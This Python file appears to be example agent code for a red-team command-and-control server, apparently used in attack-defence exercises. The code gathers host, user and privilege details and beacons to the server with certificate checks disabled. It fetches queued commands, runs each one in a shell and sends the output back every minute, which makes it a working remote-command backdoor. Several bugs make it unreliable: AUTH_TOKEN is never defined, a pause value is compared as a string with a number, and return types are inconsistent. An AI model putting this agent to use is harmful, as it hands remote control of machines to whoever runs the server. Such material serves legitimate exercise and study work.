"""
Example Python code for interacting with the Whackamole server.
Written for Python 3.10+.

Usage cases:
Use this on your periodic callback style agent to check in with the
server and get tasks waiting for the agent.
OR
Use this on your custom C2 server to create fake agent checkins from
your server to the central server using real data from agents checking in
with your server. This allows you to maintain your own server with custom
functionality, while still integrating it with our central management
server for visibility/pwnboard/sharing with teammates.

How to use:
Copy all of the below code until the big EXAMPLE banner into your program.
Modify SERVER_URL, AGENT_NAME, AGENT_TYPE to fit your program.
See main() for examples on when and how to use send_message() to
communicate with the server.
"""

import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time

SERVER_URL = "https://127.0.0.1:8000/"
AGENT_NAME = "example1"
AGENT_TYPE = "example_c2_network_code"

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    print(message)

def get_platform_dist():
    """
    Helper func that returns a string with the platform distribution.
    """
    sys_platform = platform.system()

    # --- Windows Handling ---
    if sys_platform == "Windows":
        release, version, csd, ptype = platform.win32_ver()
        return ("Windows", release, version)

    # --- Linux Handling ---
    if sys_platform == "Linux":
        # Try Python 3.10+ native method (Standardized os-release)
        if hasattr(platform, 'freedesktop_os_release'):
            try:
                info = platform.freedesktop_os_release()
                return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
            except OSError:
                pass

        # 2. Manual parsing for older Python versions (< 3.10)
        if os.path.isfile("/etc/os-release"):
            info = {}
            with open("/etc/os-release") as f:
                for line in f:
                    # Parse KEY=VALUE, ignoring comments and empty lines
                    match = re.match(r'^([A-Z_]+)="?([^"\n]+)"?$', line)
                    if match:
                        info[match.group(1)] = match.group(2)
            return (
                info.get('ID', 'linux'), 
                info.get('VERSION_ID', info.get('VERSION', '')), 
                info.get('PRETTY_NAME', '')
            )

    # Fallback for MacOS or unknown systems
    return (sys_platform, platform.release(), platform.version())

def get_os(simple=False):
    """
    Gets the approximate OS used, optionally simplified to highest level possible.
    For example: Ubuntu, Debian, Rocky, RHEL, Windows Workstation (7 8 10 11), Windows Server (2012 2016 2022 2025)

    Args: simple(Bool)
    Returns: osType(String)
    """
    system = platform.system()

    if system == "Linux":
        if simple:
            return get_platform_dist()[1] # Ubuntu, debian, redhat
        return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)

    if simple:
        return platform.system() # Windows, FreeBSD
    return f"{platform.system()} {platform.release()}" #Windows 10, Windows 2016Server, FreeBSD XXX

def get_perms():
    """
    Gets the execution perm level (user and elevation level).
    Returns: isRunAsElevated(bool), runAsUser(String)
    """
    system = platform.system()

    if system == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            is_admin = False
        # USERDOMAIN = domain or machine name
        domain = os.environ.get("USERDOMAIN", None)
        user = getpass.getuser()
        if domain:
            runAsUser = f"{domain}\\{user}"
        else:
            runAsUser = user
        return is_admin, runAsUser
    
    if system in ("Linux", "FreeBSD"):
        # euid 0 - root OR sudo
        is_root = (os.geteuid() == 0)

        # Detect sudo. May have iffy results depending on OS and inconsistent usage of SUDO_USER variable across systems. 
        sudo_user = os.environ.get("SUDO_USER")
        if sudo_user:
            runAsUser = sudo_user
        else:
            # Normal user or directly root
            runAsUser = getpass.getuser()
        return is_root, runAsUser
    
    print_debug("get_perms(): reached unexpected unsupported OS block")
    return False, ""

def get_primary_ip():
    """
    Attempts to get the primary IP address of the local machine.
    Returns: ip(String) or "0.0.0.0" if failed
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external host (e.g., Google's public DNS or test-net-3)
        # This doesn't send any data, just establishes a connection to find out which local interface would be used.
        s.connect(("8.8.8.8", 80)) # 203.0.113.2 # Doesn't need to be reachable. Use non-routable address for stealth - except that might not work so do Google.
        ip_address = s.getsockname()[0]
    except Exception as E:
        ip_address = "0.0.0.0"
        print_debug(f"get_primary_ip(): {E}")
    finally:
        s.close()
    return ip_address

def get_system_details():
    """
    Helper func that builds the overall system info dictionary
    Returns: sysInfo(dict)
    """
    sysInfo = {
        "os": get_os(),
        "executionUser": get_perms()[1],
        "executionAdmin": get_perms()[0],
        "hostname": socket.gethostname(), #alternate method: socket.getfqdn()
        "ipadd": get_primary_ip()
    }
    return sysInfo

def send_message(endpoint,message="",oldStatus=True,newStatus=True,systemInfo=get_system_details(),server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled
        # Maybe redirect to print_debug instead?
        return True

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        payload = {
            "name": AGENT_NAME,
            "hostname": systemInfo["hostname"],
            "ip": systemInfo["ipadd"],
            "os": systemInfo["os"],
            "executionUser": systemInfo["executionUser"],
            "executionAdmin": systemInfo["executionAdmin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                if "agent/beacon" in endpoint: # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                    if response_text != AUTH_TOKEN:
                        AUTH_TOKEN = response_text
                        print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""


######################################
############## Example ###############
######################################

import subprocess
def main():
    # Perform our initial connection to the server to setup the agent
    # Note: using "register" as the message is not required, but sending
    # any string unique to your initial connection attempt is good practice
    # so that you can see server side when agents connect for the first time
    status, response = send_message("agent/beacon","register")
    # No response is expected nor desired from the beacon endpoint except for
    # the auth token, which is automatically handled inside of send_message()

    # Enter our main agent loop (if your agent is designed to stay alive and
    # just keep on listening for input. If not, just do this once outside of
    # the loop and then exit the program))
    while True:
        # (Optional) check if agent should be in paused state (whatever that
        # means in your agent's context)
        # Note: no message value needed
        status, response = send_message("agent/get_pause")
        if status:
            # If the request succeeded, then read the result
            desired_pause_until = response
            # Note that python (and the server!) uses POSIX
            # epoch time (seconds, not milliseconds)
            if desired_pause_until > time.time():
                # Server wants agent to pause until this time
                # In this example case, we'll just sleep until then
                time.sleep(desired_pause_until - time.time())
            # Otherwise, no pause is desired or it's in the past,
            # so don't worry about it.
        
        # Let's see if any tasks are waiting for this agent
        status, response = send_message("agent/get_task")
        if status:
            if response != "no pending tasks":
                # We have a task waiting! Let's decode it:
                data = json.loads(response)
                task_id = data.get('task_id')
                task_command = data.get('task')

                # In our imaginary C2 agent context, let's assume that
                # tasks are just raw commands
                try:
                    resultobj = subprocess.run(
                        task_command,
                        shell=True,
                        capture_output=True, 
                        text=True,
                        check=False # Do not raise a CalledProcessError on non-zero exit code
                    )
                    result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
                except Exception as E:
                    # Always account for weird errors when you least expect it!
                    # Don't leave the server hanging:
                    print_debug(f"subprocess exception: {E}")
                    result = f"unexpected exception when trying to execute task: {str(E)[:100]}" # truncate in case it's really big
                finally:
                        # Now, we'll send the result back to the server
                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':')) # specify separators to compact whitespace
                    status, response = send_message("agent/set_task_result",message=resultjson)

        # Do our next callback to the server in 60 seconds
        time.sleep(60)

main()